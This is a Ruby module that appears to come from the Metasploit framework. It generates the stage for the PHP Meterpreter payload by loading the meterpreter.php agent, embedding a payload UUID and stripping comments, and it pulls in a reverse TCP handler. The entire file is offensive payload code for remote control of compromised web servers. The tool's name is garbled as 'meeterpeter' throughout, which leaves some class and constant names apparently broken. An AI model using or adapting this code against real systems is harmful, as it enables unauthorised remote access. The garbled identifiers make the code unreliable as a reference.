##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meeterpeter_php'
require 'msf/base/sessions/meeterpeter_options'


module Metasploit4

  include Msf::Sessions::meeterpeterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'PHP meeterpeter',
      'Description'   => 'Run a meeterpeter server in PHP',
      'Author'        => ['egypt'],
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::meeterpeter_Php_Php))
  end

  def generate_stage(opts={})
    file = File.join(Msf::Config.data_directory, "meeterpeter", "meeterpeter.php")

    met = File.open(file, "rb") { |f|
      f.read(f.stat.size)
    }

    uuid = opts[:uuid] || generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")

    met.gsub!(/#.*?$/, '')
    #met = Rex::Text.compress(met)
    met
  end
end
